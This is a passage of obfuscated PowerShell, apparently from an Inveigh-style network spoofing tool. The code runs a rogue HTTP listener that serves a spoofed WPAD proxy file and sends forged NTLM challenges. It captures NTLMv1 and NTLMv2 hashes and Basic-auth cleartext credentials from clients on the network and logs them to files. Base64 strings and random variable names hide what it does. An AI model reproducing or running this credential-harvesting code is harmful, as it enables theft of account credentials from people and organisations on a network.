            ${b85dd170d0f94766be2d36279655f2f2} = ${b85dd170d0f94766be2d36279655f2f2}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            ${b85dd170d0f94766be2d36279655f2f2} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${e84f9aa441bc451198f043a81c018d6c} = ${b85dd170d0f94766be2d36279655f2f2} -replace ' ', ''
            ${b85dd170d0f94766be2d36279655f2f2} = ${b85dd170d0f94766be2d36279655f2f2}.Split(" ") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_challenge_queue.Add(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Port + ',' + ${e84f9aa441bc451198f043a81c018d6c}) |Out-Null
        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + ${b85dd170d0f94766be2d36279655f2f2}`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + ${9b2aa225f1fa4821bc9be1847c3130fb}`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)
        ${6dd2979e2acc412ea40dc19a5a749fc7} = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        ${cfa1422ae0044e21b44241dd3cfb7461} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${6dd2979e2acc412ea40dc19a5a749fc7}
        ${1d28f5475c8c443dac61c93fa3229c75} = ${e84f9aa441bc451198f043a81c018d6c}
        Return ${cfa1422ae0044e21b44241dd3cfb7461}
    }
    ${28c5eaa66d9e494187440f73fc0cfd28} = (0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20) 
    ${6a64531fc8744c37ad38ed3c3761f0fe} = ${a4bfbe1821f142c7a8809093cf8457c1} + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list.Count
    ${7c0c3fda91b94a11a56b363a35f6961f} = ${a4bfbe1821f142c7a8809093cf8457c1} + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list.Count
    ${1c92af7260524875b5331fc09cb6af33} = ${a4bfbe1821f142c7a8809093cf8457c1} + ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list.Count
    if(${b9c6da06dea3463fb4e2486eb58b33a2} -and ${c358d7f99b2f421e9b8ba501c0c3c61f})
    {
        if(${e0eb5e5670484d639477e9049011be55})
        {
            ForEach($WPAD_direct_host in ${e0eb5e5670484d639477e9049011be55})
            {
                $WPAD_direct_hosts_function += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBmACAAKABkAG4AcwBEAG8AbQBhAGkAbgBJAHMAKABoAG8AcwB0ACwAIAAiAA=='))) + $WPAD_direct_host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgApACkAIAByAGUAdAB1AHIAbgAgACIARABJAFIARQBDAFQAIgA7AA==')))
            }
            ${e309a8f4271241eb92367323f4f19e8f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AA=='))) + $WPAD_direct_hosts_function + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAHQAdQByAG4AIAAiAFAAUgBPAFgAWQAgAA=='))) + ${b9c6da06dea3463fb4e2486eb58b33a2} + ":" + ${c358d7f99b2f421e9b8ba501c0c3c61f} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA7AH0A')))
        }
        else
        {
            ${e309a8f4271241eb92367323f4f19e8f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAA='))) + ${b9c6da06dea3463fb4e2486eb58b33a2} + ":" + ${c358d7f99b2f421e9b8ba501c0c3c61f} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA7AH0A')))
        }
    }
    elseif(${cab2ad2fb4c84cc6bc2dab829c3c3bbd})
    {
        ${e309a8f4271241eb92367323f4f19e8f} = ${cab2ad2fb4c84cc6bc2dab829c3c3bbd}
    }
    :HTTP_listener_loop while (${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
    {
        ${853f3eec379842019f656070fa6d0a8f} = $NULL
        ${e28c749b37cb4656be310944635134f0} = New-Object System.Byte[] 1024
        ${8af093942f9b452da79e566ac995425e} = $false
        while(!${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Pending() -and !${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Connected)
        {
            if(!${8af093942f9b452da79e566ac995425e})
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Waiting for incoming HTTP connection")
                ${8af093942f9b452da79e566ac995425e} = $true
            }
            sleep -s 1
            if(!${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
            {
                HTTPListenerStop
            }
        }
        if(!${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Connected)
        {
            ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client = ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.AcceptTcpClient() 
	        ${ad9d55edfa5d41b0a09076e3cf816569} = ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.GetStream() 
        }
        while (${ad9d55edfa5d41b0a09076e3cf816569}.DataAvailable)
        {
            ${ad9d55edfa5d41b0a09076e3cf816569}.Read(${e28c749b37cb4656be310944635134f0}, 0, ${e28c749b37cb4656be310944635134f0}.Length)
        }
        ${853f3eec379842019f656070fa6d0a8f} = [System.BitConverter]::ToString(${e28c749b37cb4656be310944635134f0})
        if(${853f3eec379842019f656070fa6d0a8f} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwACoA'))) -or ${853f3eec379842019f656070fa6d0a8f} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwACoA'))) -or ${853f3eec379842019f656070fa6d0a8f} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABmAC0ANABlAC0ANQAzAC0AMgAwACoA'))))
        {
            ${44e46a6310f14dbaa1af9ad8253fabb4} = ${853f3eec379842019f656070fa6d0a8f}.Substring(${853f3eec379842019f656070fa6d0a8f}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 4,${853f3eec379842019f656070fa6d0a8f}.Substring(${853f3eec379842019f656070fa6d0a8f}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 1).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) - 3)
            ${44e46a6310f14dbaa1af9ad8253fabb4} = ${44e46a6310f14dbaa1af9ad8253fabb4}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
            ${ede05207b489488bba633abba9b66f6c} = New-Object System.String (${44e46a6310f14dbaa1af9ad8253fabb4},0,${44e46a6310f14dbaa1af9ad8253fabb4}.Length)
            if(${ae8cde04bacd42438e1eccc463a80909})
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.NBNS_stopwatch = [diagnostics.stopwatch]::StartNew()
                ${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof = $true
            }
        }
        if(${853f3eec379842019f656070fa6d0a8f} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAMQAtADcANQAtADcANAAtADYAOAAtADYARgAtADcAMgAtADYAOQAtADcAQQAtADYAMQAtADcANAAtADYAOQAtADYARgAtADYARQAtADMAQQAtADIAMAAtACoA'))))
        {
            ${cb5ed35b0097443bbd84df1c46d61f7c} = ${853f3eec379842019f656070fa6d0a8f}.Substring(${853f3eec379842019f656070fa6d0a8f}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADEALQA3ADUALQA3ADQALQA2ADgALQA2AEYALQA3ADIALQA2ADkALQA3AEEALQA2ADEALQA3ADQALQA2ADkALQA2AEYALQA2AEUALQAzAEEALQAyADAALQA=')))) + 46)
            ${cb5ed35b0097443bbd84df1c46d61f7c} = ${cb5ed35b0097443bbd84df1c46d61f7c}.Substring(0,${cb5ed35b0097443bbd84df1c46d61f7c}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
            ${cb5ed35b0097443bbd84df1c46d61f7c} = ${cb5ed35b0097443bbd84df1c46d61f7c}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
            ${ccf6a5657b384a8aa7ef961c72ce461d} = New-Object System.String (${cb5ed35b0097443bbd84df1c46d61f7c},0,${cb5ed35b0097443bbd84df1c46d61f7c}.Length)
        }
        else
        {
            ${ccf6a5657b384a8aa7ef961c72ce461d} =  ''
        }
        if((${ede05207b489488bba633abba9b66f6c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and (${bbb4484245104b1da9fa046aab15160c} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))))
        {
            ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x32,0x30,0x30)
            ${a67496760e384b69bc5d1d060d8aa20c} = (0x4f,0x4b)
        }
        else
        {
            ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x34,0x30,0x31)
            ${a67496760e384b69bc5d1d060d8aa20c} = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
        }
        ${697d2d4bbd544b1d87af9a1d4ba100d5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
        ${cfa1422ae0044e21b44241dd3cfb7461} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        ${9ab5db3674d843b9a3ead0c0527a5f94} = $false
        if(${6bd93b49652547aa8dce78119322c001} -ne ${ede05207b489488bba633abba9b66f6c} -or ${4f1bdb3d4d50470cae69ebac10b52793} -ne ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.Handle)
        {
            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - ${697d2d4bbd544b1d87af9a1d4ba100d5} request for " + ${ede05207b489488bba633abba9b66f6c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address)
            ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - ${697d2d4bbd544b1d87af9a1d4ba100d5} request for " + ${ede05207b489488bba633abba9b66f6c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address)])
        }
        if(${ccf6a5657b384a8aa7ef961c72ce461d}.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
        {
            ${ccf6a5657b384a8aa7ef961c72ce461d} = ${ccf6a5657b384a8aa7ef961c72ce461d} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String(${ccf6a5657b384a8aa7ef961c72ce461d})
            ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x34,0x30,0x31)
            if ($HTTP_request_bytes[8] -eq 1)
            {
                ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x34,0x30,0x31)
                ${cfa1422ae0044e21b44241dd3cfb7461} = NTLMChallengeBase64
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                ${cfa1422ae0044e21b44241dd3cfb7461} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
                ${97432de879364c479bca23535f9f9107} = $HTTP_request_bytes[24]
                ${866459594d354049bf940e6b534a10a9} = DataLength 22 $HTTP_request_bytes
                ${156093638fc541298eaea64bb9fd24fd} = DataLength 28 $HTTP_request_bytes
                ${eac0e30018194c0e857c38e164dede10} = DataLength 32 $HTTP_request_bytes
                [string]${1d28f5475c8c443dac61c93fa3229c75} = ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_challenge_queue -like ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Port + '*'
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_challenge_queue.Remove(${1d28f5475c8c443dac61c93fa3229c75})
                ${1d28f5475c8c443dac61c93fa3229c75} = ${1d28f5475c8c443dac61c93fa3229c75}.Substring((${1d28f5475c8c443dac61c93fa3229c75}.IndexOf(","))+1)
                if(${156093638fc541298eaea64bb9fd24fd} -eq 0)
                {
                    ${9268ec44aa194b2e8df5e372e8c0c07e} = ''
                }
                else
                {  
                    ${9268ec44aa194b2e8df5e372e8c0c07e} = DataToString ${156093638fc541298eaea64bb9fd24fd} 0 0 ${eac0e30018194c0e857c38e164dede10} $HTTP_request_bytes
                } 
                ${a1b10edd06104fc3b54da6b5620dfa8b} = DataLength 36 $HTTP_request_bytes
                ${93aff52f6d0446d3ac19e39fc4a38e38} = DataToString ${a1b10edd06104fc3b54da6b5620dfa8b} ${156093638fc541298eaea64bb9fd24fd} 0 ${eac0e30018194c0e857c38e164dede10} $HTTP_request_bytes
                ${203a63171c4e4bfda5cfc4a982ada1c4} = DataLength 44 $HTTP_request_bytes
                ${4ed28e4f6a0d4e6aba1f19612af938e2} = DataToString ${203a63171c4e4bfda5cfc4a982ada1c4} ${156093638fc541298eaea64bb9fd24fd} ${a1b10edd06104fc3b54da6b5620dfa8b} ${eac0e30018194c0e857c38e164dede10} $HTTP_request_bytes
                if(${866459594d354049bf940e6b534a10a9} -eq 24) 
                {
                    ${6ea9b34ac12947f9bbfd84247566c37c} = [System.BitConverter]::ToString($HTTP_request_bytes[(${97432de879364c479bca23535f9f9107} - 24)..(${97432de879364c479bca23535f9f9107} + ${866459594d354049bf940e6b534a10a9})]) -replace "-",""
                    ${6ea9b34ac12947f9bbfd84247566c37c} = ${6ea9b34ac12947f9bbfd84247566c37c}.Insert(48,':')
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash = ${93aff52f6d0446d3ac19e39fc4a38e38} + "::" + ${9268ec44aa194b2e8df5e372e8c0c07e} + ":" + ${6ea9b34ac12947f9bbfd84247566c37c} + ":" + ${1d28f5475c8c443dac61c93fa3229c75}
                    if(((${1d28f5475c8c443dac61c93fa3229c75} -ne '') -and (${6ea9b34ac12947f9bbfd84247566c37c} -ne '')) -and ((${e3c1295ac79b4a898e098e5001c625e5} -eq 'y') -or ((${e3c1295ac79b4a898e098e5001c625e5} -eq 'n') -and (-not ${93aff52f6d0446d3ac19e39fc4a38e38}.EndsWith('$')))))
                    {    
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - ${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv1 challenge/response for ${9268ec44aa194b2e8df5e372e8c0c07e}\${93aff52f6d0446d3ac19e39fc4a38e38} captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address + "(" + ${4ed28e4f6a0d4e6aba1f19612af938e2} + ")")])
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue.add(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list.add(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - ${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv1 challenge/response captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address + "(" + ${4ed28e4f6a0d4e6aba1f19612af938e2} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                        {
                            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv1 challenge/response written to " + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_out_file)
                        }                   
                    }
                    ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x32,0x30,0x30)
                    ${73119a454e2b41c1b9dcb29ba1555e6a} = $true
                    ${1d28f5475c8c443dac61c93fa3229c75} = ''
                }
                else 
                {         
                    ${6ea9b34ac12947f9bbfd84247566c37c} = [System.BitConverter]::ToString($HTTP_request_bytes[${97432de879364c479bca23535f9f9107}..(${97432de879364c479bca23535f9f9107} + ${866459594d354049bf940e6b534a10a9})]) -replace "-",""
                    ${6ea9b34ac12947f9bbfd84247566c37c} = ${6ea9b34ac12947f9bbfd84247566c37c}.Insert(32,':')
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash = ${93aff52f6d0446d3ac19e39fc4a38e38} + "::" + ${9268ec44aa194b2e8df5e372e8c0c07e} + ":" + ${1d28f5475c8c443dac61c93fa3229c75} + ":" + ${6ea9b34ac12947f9bbfd84247566c37c}
                    if(((${1d28f5475c8c443dac61c93fa3229c75} -ne '') -and (${6ea9b34ac12947f9bbfd84247566c37c} -ne '')) -and ((${e3c1295ac79b4a898e098e5001c625e5} -eq 'y') -or ((${e3c1295ac79b4a898e098e5001c625e5} -eq 'n') -and (-not ${93aff52f6d0446d3ac19e39fc4a38e38}.EndsWith('$')))))
                    {
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add($(Get-Date -format 's') + " - ${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv2 challenge/response for ${9268ec44aa194b2e8df5e372e8c0c07e}\${93aff52f6d0446d3ac19e39fc4a38e38} captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address + "(" + ${4ed28e4f6a0d4e6aba1f19612af938e2} + ")")])
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue.add(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list.add(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add($(Get-Date -format 's') + " - ${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv2 challenge/response captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address + "(" + ${4ed28e4f6a0d4e6aba1f19612af938e2} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_NTLM_hash)
                        if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                        {
                            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("${697d2d4bbd544b1d87af9a1d4ba100d5} NTLMv2 challenge/response written to " + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_out_file)
                        }
                    }
                }
                ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x32,0x30,0x30)
                ${a67496760e384b69bc5d1d060d8aa20c} = (0x4f,0x4b)
                ${9ab5db3674d843b9a3ead0c0527a5f94} = $true
                ${73119a454e2b41c1b9dcb29ba1555e6a} = $true
                ${1d28f5475c8c443dac61c93fa3229c75} = ''
            }
            else
            {
                ${cfa1422ae0044e21b44241dd3cfb7461} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            }    
        }
        elseif(${ccf6a5657b384a8aa7ef961c72ce461d}.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA')))))
        {
            ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x32,0x30,0x30)
            ${a67496760e384b69bc5d1d060d8aa20c} = (0x4f,0x4b)
            ${ccf6a5657b384a8aa7ef961c72ce461d} = ${ccf6a5657b384a8aa7ef961c72ce461d} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA'))),''
            ${80fe0d13c2f943268143310a192c5faa} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${ccf6a5657b384a8aa7ef961c72ce461d}))
            ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address)])
            ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue.add(${80fe0d13c2f943268143310a192c5faa})
            ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list.add(${80fe0d13c2f943268143310a192c5faa})
            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Basic auth cleartext credentials ${80fe0d13c2f943268143310a192c5faa} captured from " + ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.RemoteEndpoint.Address)
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAAYQB1AHQAaAAgAGMAbABlAGEAcgB0AGUAeAB0ACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAA=='))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_out_file)
            }     
        }
        ${9b2aa225f1fa4821bc9be1847c3130fb} = Get-Date -format r
        ${9b2aa225f1fa4821bc9be1847c3130fb} = [System.Text.Encoding]::UTF8.GetBytes(${9b2aa225f1fa4821bc9be1847c3130fb})
        if(((${b9c6da06dea3463fb4e2486eb58b33a2} -and ${c358d7f99b2f421e9b8ba501c0c3c61f}) -or ${cab2ad2fb4c84cc6bc2dab829c3c3bbd}) -and ${ede05207b489488bba633abba9b66f6c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
        {
            ${de6094eb15be4d9ebb56241d78e0cc6d} = ${e309a8f4271241eb92367323f4f19e8f}
        }
        elseif(${b99aeade7d42477bb7323da939ca37f5} -and ${ede05207b489488bba633abba9b66f6c} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
        {
            ${de6094eb15be4d9ebb56241d78e0cc6d} = ${b99aeade7d42477bb7323da939ca37f5}
        }
        else
        {
            ${de6094eb15be4d9ebb56241d78e0cc6d} = ''
        }
        ${9b2aa225f1fa4821bc9be1847c3130fb} = Get-Date -format r
        ${9b2aa225f1fa4821bc9be1847c3130fb} = [System.Text.Encoding]::UTF8.GetBytes(${9b2aa225f1fa4821bc9be1847c3130fb})
        if((${a82319c2a58b4b90a87c560c5727045b} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))) -and ${ede05207b489488bba633abba9b66f6c} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or (${bbb4484245104b1da9fa046aab15160c} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))) -and ${ede05207b489488bba633abba9b66f6c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and !${9ab5db3674d843b9a3ead0c0527a5f94})
        { 
            ${cfa1422ae0044e21b44241dd3cfb7461} = [System.Text.Encoding]::UTF8.GetBytes(${cfa1422ae0044e21b44241dd3cfb7461})
            ${8947430ab9de464a96b5af36bc75b141} = (0x0d,0x0a)
            ${2afcb53cd1664ab89f755ef5e8fd9449} = [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d}.Length)
            ${8947430ab9de464a96b5af36bc75b141} += [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d})
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + ${8d702e270d9d413fbd0f4bc6c8ab1bd3}`
                + (0x20)`
                + ${a67496760e384b69bc5d1d060d8aa20c}`
                + (0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + ${9b2aa225f1fa4821bc9be1847c3130fb}`
                + (0x0d,0x0a)`
                + ${28c5eaa66d9e494187440f73fc0cfd28}`
                + ${cfa1422ae0044e21b44241dd3cfb7461}`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20)`
                + ${2afcb53cd1664ab89f755ef5e8fd9449}`
                + (0x0d,0x0a)`
                + ${8947430ab9de464a96b5af36bc75b141} 
        }
        elseif((${a82319c2a58b4b90a87c560c5727045b} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${ede05207b489488bba633abba9b66f6c} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or (${bbb4484245104b1da9fa046aab15160c} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${ede05207b489488bba633abba9b66f6c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))))
